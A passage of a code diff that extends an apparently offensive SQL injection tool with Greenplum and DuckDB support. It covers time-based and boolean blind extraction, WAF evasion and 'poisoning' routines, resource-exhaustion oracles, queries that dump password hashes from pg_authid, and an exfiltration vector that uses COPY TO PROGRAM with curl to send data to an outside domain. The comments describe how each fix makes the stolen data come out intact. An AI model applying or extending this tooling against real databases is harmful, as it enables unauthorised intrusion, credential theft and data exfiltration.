+        # YugabyteDB, Greenplum, and DuckDB were absent from the SUBSTRING list and fell to
+        # "SUBSTR". All three are PostgreSQL-wire-compatible and use SUBSTRING (SQL standard
+        # form), not SUBSTR (Oracle/MySQL form). SUBSTR in PostgreSQL-family raises a syntax
+        # error when called with (expr, pos, len) positional args instead of SUBSTR(expr FROM
+        # pos FOR len) → SQL error on every char probe → oracle always False → empty extraction.
+        # Fix: add these three DBMSes to the SUBSTRING branch matching their DBMS_QUERIES entries.
+        substr = "SUBSTRING" if dbms in ("MSSQL", "PostgreSQL", "CockroachDB",
+                                          "Amazon Redshift", "YugabyteDB",
+                                          "Greenplum", "DuckDB") else "SUBSTR"
     # FIX-v19.17: Firebird uses ASCII_VAL not ASCII
     # FIX-TBEXTRACT-SQLITE-ASCII: SQLite has no ASCII() function; it uses UNICODE().
     # Using ASCII() in SQLite always returns NULL → binary search never narrows →
@@ -151437,7 +152082,7 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 # which tried CASE WHEN — the very form that was blocked by the WAF,
                 # causing extraction to silently produce no timing signal.
                 # Fix: add aliases so each strategy name reaches the correct transform.
-                elif form in ("arith_cast", "arith_pg") and dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                elif form in ("arith_cast", "arith_pg") and dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     arith_arg = f"({condition})::int * {t}"
                     mod = T.replace_function_arg(p, r"pg_sleep", arith_arg)
                     if mod: return mod, []
@@ -151509,7 +152154,7 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                                 f"ELSE 0 END)")
                         return f"{_pfx} AND {_cjm}>=0-- -", []
 
-                elif form in ("heavy_computation_pg", "cross_join_pg") and dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                elif form in ("heavy_computation_pg", "cross_join_pg") and dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     # BUG-MAKEPAYLOAD-HEAVY-PG-APPEND FIX (HIGH): Same append-after-comment
                     # bug as heavy_computation_mysql. Strip heavy computation from p to recover
                     # injection prefix, then rebuild with extraction condition.
@@ -151556,7 +152201,7 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                     # BUG-EXTRACTION-TAMPER-CONDITION FIX: obfuscate condition
                     _ocond = _obfuscate_cond(condition)
                     ca = f"CASE WHEN ({_ocond}) THEN {t} ELSE 0 END"
-                    if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                    if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                         mod = T.replace_function_arg(p, r"pg_sleep", ca)
                         if mod:
                             LOG.debug(f"[TBExtract] pg_sleep CASE WHEN: {mod[:80]!r}")
@@ -151691,7 +152336,7 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # block function calls like ASCII(SUBSTRING(...)) separately.
             # Canary must test a REAL database expression, not a string literal.
             # 'A' passes but version()/current_catalog may be blocked separately.
-            if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 _canary_cond = f"ASCII({substr}(current_catalog,1,1))>0"
             elif dbms in ("MySQL", "MariaDB", "TiDB"):
                 # BUG-V163-TBEXTRACT-MYSQL-CANARY FIX (HIGH, MySQL/MariaDB/TiDB;
@@ -151769,7 +152414,7 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 # try progressively simpler constant-only canary conditions. These use only
                 # numeric literals or simple comparisons that deep-inspection WAFs should pass.
                 _simple_canaries = []
-                if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     _simple_canaries = [
                         "1=1",
                         "2>1",
@@ -151916,7 +152561,7 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                     # Calibration only proves CASE WHEN (1=1) passes  WAFs
                     # often separately block ASCII/SUBSTRING inside the condition.
                     # ASCII(SUBSTRING('A',1,1))>64 is always TRUE, no DB access needed.
-                    if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                    if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                         _canary_cond = f"ASCII({substr}(current_catalog,1,1))>0"
                     elif dbms in ("MySQL", "MariaDB", "TiDB"):
                         # BUG-V163-TBEXTRACT-MYSQL-CANARY FIX (second occurrence in EBF loop):
@@ -152199,6 +152844,16 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             "current_user()":     "current_user",
             "database()":         "current_catalog",
         },
+        "Greenplum": {
+            "current_database()": "current_catalog",
+            "current_user()":     "current_user",
+            "database()":         "current_catalog",
+        },
+        "DuckDB": {
+            "current_database()": "current_catalog",
+            "current_user()":     "current_user",
+            "database()":         "current_catalog",
+        },
         "MSSQL": {
             # db_name() and user_name() have no valid nofunc form in MSSQL;
             # omitting them so the query is not remapped to an invalid form.
@@ -152416,7 +153071,8 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # in the printable ASCII range. The ASCII() function in PostgreSQL
             # already returns values in 0-127 for ASCII characters and NULL for
             # characters outside ASCII — so hi=255 was never reachable anyway.
-            if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                        "Greenplum", "DuckDB"):
                 # BUG-TBEXTRACT-YUGABYTEDB-CHAR-HI FIX: added YugabyteDB.
                 # YugabyteDB is PostgreSQL-wire-compatible and uses UTF-8 encoding.
                 # Binary search probing values 127-255 on a UTF-8 PG-compat engine
@@ -152433,7 +153089,15 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 # producing inconsistent timing responses that corrupt binary-search oracle
                 # results. Added Amazon Redshift to the 126-cap group so all PG-wire-compat
                 # UTF-8 engines share the same safe printable-ASCII-only ceiling.
-                # Numeric safety: _char_hi_init is a plain integer; only bounds the loop.
+                # BUG-TBEXTRACT-GREENPLUM-DUCKDB-CHAR-HI FIX (HIGH; Greenplum/DuckDB;
+                # _time_based_extract_inner; T/TH/HQ; all surfaces; all HTTP methods):
+                # Greenplum and DuckDB were absent from the 1,114,111 branch and fell to
+                # else 255. Both are PostgreSQL-wire-compatible; their ASCII() function returns
+                # full Unicode code points (0..U+10FFFF = 1,114,111). With _char_hi_init=255,
+                # any character with code point > 255 (Greek, CJK, emoji, accented chars)
+                # causes the binary search to converge at lo=255 → chr(255)='ÿ' returned
+                # silently for every non-Latin-1 character on Greenplum/DuckDB targets.
+                # Numeric safety: _char_hi_init is a plain integer binary-search ceiling.
                 #
                 # BUG-TBEXTRACT-PG-CHAR-HI-126 FIX (HIGH, PostgreSQL/CockroachDB/YugabyteDB/
                 # Amazon Redshift; _time_based_extract_inner; T/TH/HQ techniques; all surfaces;
@@ -154320,6 +154984,30 @@ class ChameleonExtractor:
             "ISNULL(IIF(({cond}),{t},NULL),{f})",
             "(SELECT {t} WHERE ({cond})) + COALESCE((SELECT {f} WHERE NOT ({cond})),0)",
         ],
+        # BUG-CHAMELEON-GREENPLUM-DUCKDB-FAMILIES-MISSING FIX (HIGH; ChameleonExtractor;
+        # ChameleonExtractorV18; B/BH/IN techniques; all surfaces):
+        # Greenplum and DuckDB were absent from FAMILIES. _pick_family() fell to the
+        # MySQL fallback which uses IF(({cond}),{t},{f}) — MySQL-exclusive, does not
+        # exist in Greenplum/DuckDB (PostgreSQL-compatible). Every boolean probe raised
+        # "function if() does not exist" → oracle always False → binary search converges
+        # to lo=0 → ChameleonExtractor returns "" for all Greenplum/DuckDB extractions.
+        # Fix: add PostgreSQL-compatible family expressions identical to the PostgreSQL
+        # entry, since both Greenplum (based on PostgreSQL 8.3+) and DuckDB support
+        # CASE WHEN, UNION, arithmetic with boolean::int, GREATEST, ARRAY, etc.
+        "Greenplum": [
+            "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
+            "(SELECT {t} WHERE ({cond}) UNION ALL SELECT {f} WHERE NOT ({cond}) LIMIT 1)",
+            "({t})*({cond}::int)+({f})*(1-({cond}::int))",
+            "GREATEST({f},({cond}::int)*{t})",
+            "({f}+({cond}::int)*({t}-{f}))",
+        ],
+        "DuckDB": [
+            "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
+            "(SELECT {t} WHERE ({cond}) UNION ALL SELECT {f} WHERE NOT ({cond}) LIMIT 1)",
+            "({t})*({cond}::int)+({f})*(1-({cond}::int))",
+            "GREATEST({f},({cond}::int)*{t})",
+            "({f}+({cond}::int)*({t}-{f}))",
+        ],
     }
 
     # Micro-mutation layers applied on top of family selection
@@ -154638,6 +155326,16 @@ class ChameleonExtractor:
             # in ClickHouse). toUInt32OrNull() returns the full Unicode codepoint (not just the
             # first byte), matching the char_hi = 1114111 used for ClickHouse elsewhere.
             "ClickHouse":  "coalesce(toUInt32OrNull(substring(({query}),{pos},1)),0)",
+            # BUG-CE-CHARFN-GREENPLUM-DUCKDB-REDSHIFT FIX (HIGH): Greenplum, DuckDB, and
+            # Amazon Redshift were absent from _chameleon_charfn_defaults → fell to the
+            # default "ASCII(SUBSTRING(...))" which uses uppercase function names.
+            # All three are PostgreSQL-compatible and require COALESCE(ASCII(SUBSTRING(...)))
+            # — exactly the same as PostgreSQL. The missing COALESCE wrapper also means
+            # NULL at end-of-string propagates to the binary search oracle → comparison
+            # NULL >= mid → UNKNOWN → bisection does not terminate → wrong last character.
+            "Amazon Redshift": "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
+            "Greenplum":       "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
+            "DuckDB":          "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
         }
         _chameleon_default_fn = _chameleon_charfn_defaults.get(
             _chameleon_dbms, "ASCII(SUBSTRING(({query}),{pos},1))")
@@ -155340,6 +156038,8 @@ class AdaptiveFrequencyExtractor:
                             "SQLite", "MySQL", "MariaDB", "TiDB",
                             "PostgreSQL", "CockroachDB", "YugabyteDB",
                             "Amazon Redshift",  # BUG-V139-AFE-AMZN-REDSHIFT-CHARHI FIX
+                            "Greenplum",        # BUG-AFE-GREENPLUM-CHAR-HI FIX
+                            "DuckDB",           # BUG-AFE-DUCKDB-CHAR-HI FIX
                             "ClickHouse")       # BUG-AFE-CLICKHOUSE-CHAR-HI FIX
                         else 255)
         # BUG-AFE-LO-INIT FIX (MEDIUM, all 5 DBMSes, all surfaces):
@@ -155572,6 +156272,15 @@ class AdaptiveFrequencyExtractor:
             # returns the full Unicode codepoint (0..1114111) for any UTF-8 string.
             # Functions are lowercase per ClickHouse convention.
             "ClickHouse":  "coalesce(toUInt32OrNull(substring(({query}),{pos},1)),0)",
+            # BUG-AFE-CHARFN-GREENPLUM-DUCKDB-REDSHIFT FIX (HIGH): Greenplum, DuckDB, and
+            # Amazon Redshift were absent from _afe_charfn_defaults → fell to the default
+            # "ASCII(SUBSTRING(...))" — valid SQL but missing the COALESCE(,0) wrapper.
+            # NULL at end-of-string propagates to binary search → UNKNOWN comparison →
+            # wrong last character extracted. All three are PostgreSQL-compatible and use
+            # COALESCE(ASCII(SUBSTRING(...))), identical to the PostgreSQL entry.
+            "Amazon Redshift": "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
+            "Greenplum":       "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
+            "DuckDB":          "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
         }
         _afe_default_fn = _afe_charfn_defaults.get(
             _afe_dbms, "ASCII(SUBSTRING(({query}),{pos},1))")
@@ -155890,7 +156599,7 @@ class AntiLearningWAFPoisoner:
         if not text: return 0.0
         freq  = Counter(text)
         total = len(text)
-        return -sum((c/total)*_math.log2(c/total) for c in freq.values())
+        return -sum((c/total)*math.log2(c/total) for c in freq.values())
 
     def _ensure_diversity(self, pool: List[str], min_entropy: float = 3.5) -> List[str]:
         """Ensure the pool has sufficient entropy before use."""
@@ -156086,9 +156795,14 @@ DBMS_QUERIES_EXTENSION: Dict[str, Dict[str, str]] = {
         "count":        "SELECT count(*) FROM {db}.{table}",
         "row":          "SELECT {cols} FROM {db}.{table} LIMIT 1 OFFSET {offset}",
         "users":        "SELECT 'N/A'",
-        "char_func":    "ascii(substr(({query}),{pos},1))",
+        # BUG-DBMSQEXT-DUCKDB-CHARFUNC-COALESCE FIX (HIGH): ascii() returns NULL when pos >
+        # length(query) in DuckDB. Without coalesce, NULL propagates into binary-search oracle →
+        # NULL >= mid evaluates to NULL → bisection wrong → last character corrupted.
+        "char_func":    "coalesce(ascii(substr(({query}),{pos},1)),0)",
         "substr":       "substr(({query}),{pos},1)",
-        "len_func":     "length(({query}))",
+        # DuckDB length() counts characters (not bytes) so no CHAR_LENGTH switch needed.
+        # COALESCE for NULL safety on NULL columns.
+        "len_func":     "coalesce(length(({query})),0)",
         "if_func":      "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
         "privileges":   "SELECT 'N/A'",
     },
@@ -156172,10 +156886,16 @@ DBMS_QUERIES_EXTENSION: Dict[str, Dict[str, str]] = {
         "count":        "SELECT COUNT(*) FROM \"{db}\".\"{table}\"",
         "row":          "SELECT concat_ws('|',{cols}) FROM \"{db}\".\"{table}\" OFFSET {offset} LIMIT 1",
         "users":        "SELECT string_agg(rolname,',') FROM pg_roles WHERE rolcanlogin",
-        "char_func":    "ASCII(SUBSTR(({query}),{pos},1))",
+        # BUG-DBMSQEXT-YUGABYTEDB-CHARFUNC-COALESCE FIX (HIGH): ASCII() returns NULL when
+        # pos > CHAR_LENGTH(query) in YugabyteDB. Without COALESCE, NULL propagates into
+        # binary-search oracle → NULL >= mid → UNKNOWN → bisection wrong → last char corrupted.
+        "char_func":    "COALESCE(ASCII(SUBSTR(({query}),{pos},1)),0)",
         "char_func_hex":"encode(SUBSTR(({query}),{pos},1)::bytea,'hex')",
         "substr":       "SUBSTR(({query}),{pos},1)",
-        "len_func":     "LENGTH(({query}))",
+        # BUG-DBMSQEXT-YUGABYTEDB-LENF-CHARLEN FIX (HIGH): LENGTH() counts bytes in UTF-8
+        # mode; CHAR_LENGTH counts characters. Overcount causes extra null reads → trailing
+        # garbage appended. COALESCE converts NULL (from NULL columns) to 0.
+        "len_func":     "COALESCE(CHAR_LENGTH(({query})),0)",
         "if_func":      "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
         "privileges":   "SELECT string_agg(privilege_type,',') FROM information_schema.role_table_grants WHERE grantee=current_user",
     },
@@ -156191,9 +156911,16 @@ DBMS_QUERIES_EXTENSION: Dict[str, Dict[str, str]] = {
         "count":        "SELECT COUNT(*) FROM \"{db}\".\"{table}\"",
         "row":          "SELECT concat_ws('|',{cols}) FROM \"{db}\".\"{table}\" LIMIT 1 OFFSET {offset}",
         "users":        "SELECT string_agg(rolname,',') FROM pg_roles",
-        "char_func":    "ASCII(SUBSTR(({query}),{pos},1))",
+        # BUG-DBMSQEXT-GREENPLUM-CHARFUNC-COALESCE FIX (HIGH): ASCII() returns NULL when
+        # pos > CHAR_LENGTH(query). Without COALESCE, NULL propagates into binary-search
+        # oracle → NULL >= mid evaluates to UNKNOWN → bisection converges wrong → last
+        # character corrupted. Also CHAR_LENGTH not LENGTH (bytes vs chars).
+        "char_func":    "COALESCE(ASCII(SUBSTR(({query}),{pos},1)),0)",
         "substr":       "SUBSTR(({query}),{pos},1)",
-        "len_func":     "LENGTH(({query}))",
+        # BUG-DBMSQEXT-GREENPLUM-LENF-CHARLEN FIX (HIGH): LENGTH() counts bytes; CHAR_LENGTH
+        # counts characters. For UTF-8 data, LENGTH > CHAR_LENGTH → extra null reads → trailing
+        # garbage. COALESCE converts NULL to 0 (empty string case).
+        "len_func":     "COALESCE(CHAR_LENGTH(({query})),0)",
         "if_func":      "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
         "privileges":   "SELECT string_agg(privilege_type,',') FROM information_schema.role_table_grants WHERE grantee=current_user",
     },
@@ -156688,7 +157415,7 @@ class StackedQueryExtractor:
             # UNICODE() returns 0-65535 for the full BMP.
             # BUG-STACKED-SQLITE-FIX: SQLite fell through to "Unsupported DBMS" (returned None),
             # completely blocking all StackedQueryExtractor runs on SQLite targets.
-            if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 # BUG-V141-STACKED-CRDB-YGB-MISSING FIX (HIGH, CockroachDB/YugabyteDB;
                 # StackedQueryExtractor.extract_via_stacked; S/DS techniques; all surfaces):
                 # CockroachDB and YugabyteDB (PostgreSQL-wire-compatible) fell to
@@ -156895,7 +157622,7 @@ class StackedQueryExtractor:
         # generic else branch which used MySQL/PostgreSQL-specific syntax that may not match
         # the actual DBMS, producing SQL errors or wrong results.
         # Fix: group compatible DBMSes together matching the extract_via_stacked dispatch.
-        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             query = "SELECT version()"
         elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
             query = "SELECT version()"
@@ -156913,7 +157640,7 @@ class StackedQueryExtractor:
     async def extract_database(self) -> str:
         """Extract current database"""
         # BUG-V141-STACKED-METHODS-DBMS FIX: same grouping as extract_version above.
-        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             query = "SELECT current_database()"
         elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
             query = "SELECT database()"
@@ -156931,7 +157658,7 @@ class StackedQueryExtractor:
     async def extract_user(self) -> str:
         """Extract current user"""
         # BUG-V141-STACKED-METHODS-DBMS FIX: same grouping as extract_version above.
-        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             query = "SELECT current_user"
         elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
             query = "SELECT user()"
@@ -157205,7 +157932,8 @@ class ExtractionOrchestrator:
                 if 'LIMIT ' not in qu:
                     return f"({q} LIMIT 1)"
                 return f"({q})"
-            elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                          "Greenplum", "DuckDB"):
                 if 'LIMIT ' not in qu:
                     return f"({q} LIMIT 1)"
                 return f"({q})"
@@ -157238,7 +157966,11 @@ class ExtractionOrchestrator:
         # Numeric safety: the _probe closure applies apply_heavy_variation() and
         # _obfuscate_extraction_cond() to the full payload before sending; the
         # comparison value (mid+1) is a plain integer literal and is never rewritten.
-        if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                     "Greenplum", "DuckDB"):
+            # BUG-EXTDT-GREENPLUM-DUCKDB-CTPL FIX (HIGH): Greenplum and DuckDB absent →
+            # fell to else branch with ASCII(SUBSTRING(...)) — syntactically valid but
+            # missing CHAR_LENGTH for len template. Also CHAR_LENGTH not LENGTH (bytes).
             _ctpl = "ASCII(SUBSTRING(" + "{lq}" + ",{p},1))>={m}"
             # FIX-ISSUE-8: Use CHAR_LENGTH for PostgreSQL character count (not byte count)
             # LENGTH() in PostgreSQL returns bytes for UTF-8; CHAR_LENGTH returns characters.
@@ -157572,7 +158304,7 @@ class ExtractionOrchestrator:
         # CASE-WHEN expression even when the 1=1 calibration probe passes.  Build a
         # list of fallback length templates per DBMS so we can retry with alternatives
         # before giving up with return "".
-        if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             _ltpl_alts = [
                 "LENGTH({lq})>={m}",
                 "OCTET_LENGTH({lq})>={m}",
@@ -158434,10 +159166,14 @@ class ExtractionOrchestrator:
                 _bov_true_map  = {"MySQL":"1<2","MariaDB":"1<2","TiDB":"1<2",
                                   "PostgreSQL":"1<2","CockroachDB":"1<2","YugabyteDB":"1<2",
                                   "Amazon Redshift":"1<2",
+                                  "Greenplum": "1<2",
+                                  "DuckDB": "1<2",
                                   "MSSQL":"1<2","SQLite":"1<2","Oracle":"1<2"}
                 _bov_false_map = {"MySQL":"1>2","MariaDB":"1>2","TiDB":"1>2",
                                   "PostgreSQL":"1>2","CockroachDB":"1>2","YugabyteDB":"1>2",
                                   "Amazon Redshift":"1>2",
+                                  "Greenplum": "1>2",
+                                  "DuckDB": "1>2",
                                   "MSSQL":"1>2","SQLite":"1>2","Oracle":"1>2"}
                 _bov_true_cond  = _bov_true_map.get(dbms, "1<2")
                 _bov_false_cond = _bov_false_map.get(dbms, "1>2")
@@ -160089,6 +160825,24 @@ DBMS_EXTENDED: Dict[str, Dict[str, str]] = {
         "collation":      "SELECT current_setting('lc_collate')",
         "yb_version":     "SELECT yb_server_version()",
         "yb_nodes":       "SELECT string_agg(host||':'||port::text,',') FROM yb_servers()",
+    },
+    "Greenplum": {
+        "passwords":      "SELECT string_agg(rolname||':'||rolpassword,',') FROM pg_authid WHERE rolpassword IS NOT NULL",
+        "schemas":        "SELECT string_agg(nspname,',') FROM pg_catalog.pg_namespace WHERE nspname NOT IN ('pg_catalog','information_schema','pg_toast','gp_toolkit')",
+        "indexes":        "SELECT string_agg(indexname,',') FROM pg_indexes WHERE schemaname='{db}' AND tablename='{table}'",
+        "col_types":      "SELECT string_agg(column_name||':'||data_type,',' ORDER BY ordinal_position) FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
+        "rows_chunked":   "SELECT string_agg(CAST({cols} AS TEXT),'||R||') FROM (SELECT {cols} FROM \"{db}\".\"{table}\" ORDER BY 1 LIMIT {limit} OFFSET {offset}) t",
+        "char_func_hex":  "encode(SUBSTRING(({query}),{pos},1)::bytea,'hex')",
+        "version_full":   "SELECT version()||'/'||current_setting('server_encoding')",
+    },
+    "DuckDB": {
+        "passwords":      "SELECT current_user",
+        "schemas":        "SELECT string_agg(schema_name,',') FROM information_schema.schemata WHERE catalog_name=current_database()",
+        "indexes":        "SELECT string_agg(index_name,',') FROM duckdb_indexes() WHERE schema_name='{db}' AND table_name='{table}'",
+        "col_types":      "SELECT string_agg(column_name||':'||data_type,',' ORDER BY ordinal_position) FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
+        "rows_chunked":   "SELECT string_agg(CAST({cols} AS TEXT),'||R||') FROM (SELECT {cols} FROM \"{table}\" ORDER BY 1 LIMIT {limit} OFFSET {offset}) t",
+        "char_func_hex":  "lower(hex(ascii(substring(({query}),{pos},1))))",
+        "version_full":   "SELECT version()",
     },
 }
 
@@ -164020,8 +164774,14 @@ class BatchedBoolExtractor:
                        "+ASCII(SUBSTRING(({q}),{p2},1))*128"
                        "+ASCII(SUBSTRING(({q}),{p3},1))*16384"),
         "Amazon Redshift": ("ASCII(SUBSTRING(({q}),{p1},1))"
-                            "+ASCII(SUBSTRING(({q}),{p2},1))*128"
-                            "+ASCII(SUBSTRING(({q}),{p3},1))*16384"),
+                             "+ASCII(SUBSTRING(({q}),{p2},1))*128"
+                             "+ASCII(SUBSTRING(({q}),{p3},1))*16384"),
+        "Greenplum": ("ASCII(SUBSTRING(({q}),{p1},1))"
+                      "+ASCII(SUBSTRING(({q}),{p2},1))*128"
+                      "+ASCII(SUBSTRING(({q}),{p3},1))*16384"),
+        "DuckDB": ("ASCII(SUBSTRING(({q}),{p1},1))"
+                   "+ASCII(SUBSTRING(({q}),{p2},1))*128"
+                   "+ASCII(SUBSTRING(({q}),{p3},1))*16384"),
         # BUG-M FIX: Oracle and SQLite were absent from PACK_EXPR, falling back to the
         # MySQL default (ORD(SUBSTRING(...))).  ORD() is MySQL-specific and does not exist
         # in Oracle or SQLite; SUBSTRING() is non-standard in older Oracle versions.
@@ -165605,6 +166365,8 @@ class WAFWeaponizationOracle:
             "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -165624,6 +166386,8 @@ class WAFWeaponizationOracle:
             "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Greenplum": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "DuckDB": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "MySQL":           "ISNULL(1e0)",
             "MariaDB":         "ISNULL(1e0)",
             "TiDB":            "ISNULL(1e0)",
@@ -165697,6 +166461,8 @@ class MicroTimingOracle:
         "CockroachDB": "pg_sleep({delay})",
         "YugabyteDB": "pg_sleep({delay})",          # BUG-MICRO-SLEEP-YUGABYTE FIX
         "Amazon Redshift": "pg_sleep({delay})",     # BUG-MICRO-SLEEP-REDSHIFT FIX
+        "Greenplum": "pg_sleep({delay})",     # BUG-MICRO-SLEEP-REDSHIFT FIX
+        "DuckDB": "pg_sleep({delay})",     # BUG-MICRO-SLEEP-REDSHIFT FIX
         "MySQL": "SLEEP({delay})",
         "MariaDB": "SLEEP({delay})",
         "TiDB": "SLEEP({delay})",                   # BUG-MICRO-SLEEP-TIDB-MAP FIX
@@ -165746,7 +166512,7 @@ class MicroTimingOracle:
             return (f"CASE WHEN ({cond}) THEN (SELECT COUNT(*) FROM sys.objects A, "
                     f"sys.objects B WHERE A.object_id > 0 AND B.object_id > 0 "
                     f"AND A.object_id < {_micro_rows}) ELSE 1 END")
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             # BUG-MICRO-PG-VOID FIX (v70): `pg_sleep(delay)*(cond::int)` multiplies
             # void×integer — PostgreSQL raises "operator does not exist: void * integer".
             # Both true and false samples return fast error responses → no timing signal.
@@ -165897,6 +166663,8 @@ class ResourceBombOracle:
         "CockroachDB": "SELECT COUNT(*) FROM generate_series(1,{size}) a, generate_series(1,10) b",
         "YugabyteDB": "SELECT COUNT(*) FROM generate_series(1,{size}) a, generate_series(1,10) b",  # BUG-RSBOMB-YUGABYTE FIX
         "Amazon Redshift": "SELECT COUNT(*) FROM generate_series(1,{size}) a, generate_series(1,10) b",  # BUG-RSBOMB-REDSHIFT FIX
+        "Greenplum": "SELECT COUNT(*) FROM generate_series(1,{size}) a, generate_series(1,10) b",  # BUG-RSBOMB-REDSHIFT FIX
+        "DuckDB": "SELECT COUNT(*) FROM generate_series(1,{size}) a, generate_series(1,10) b",  # BUG-RSBOMB-REDSHIFT FIX
         "MySQL": "SELECT BENCHMARK({size},SHA1('x'))",
         "MariaDB": "SELECT BENCHMARK({size},SHA1('x'))",
         "TiDB": "SELECT BENCHMARK({size},SHA1('x'))",  # BUG-RSBOMB-TIDB FIX: TiDB supports BENCHMARK()
@@ -165913,7 +166681,7 @@ class ResourceBombOracle:
         if dbms in ("MySQL", "MariaDB", "TiDB"):
             # BUG-RSBOMB-CONDITIONAL-TIDB FIX: TiDB supports IF() like MySQL.
             return f"IF(({cond}),1,({bomb}))"
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             return f"(1*(({cond})::int) + ({bomb})*(1-(({cond})::int)))"
         elif dbms in ("MSSQL", "Sybase"):
             return f"CASE WHEN ({cond}) THEN 1 ELSE ({bomb}) END"  # BUG-MSSQL-IF-STMT FIX: T-SQL IF is a statement, can't embed as expression; use CASE WHEN ... END
@@ -165947,6 +166715,18 @@ class AlternativeDNSExfil:
              "COPY (SELECT ({query})) TO PROGRAM 'curl -sk \"http://{domain}/?d=$(cat /dev/stdin | xxd -p | tr -d ''\\n'')\" > /dev/null 2>&1'"),
             # REMOVED: lo_export — lo_from_bytea() creates a PG internal large object
             # but makes no network call; it cannot exfiltrate data to any external channel.
+        ],
+        # BUG-ALTDNS-GREENPLUM-PG-FAMILY FIX (MEDIUM): Greenplum was absent from
+        # EXFIL_VECTORS → get_vectors() returned [] → AlternativeDNSExfil exfil channel
+        # permanently non-functional for Greenplum targets. Greenplum is a PG fork and
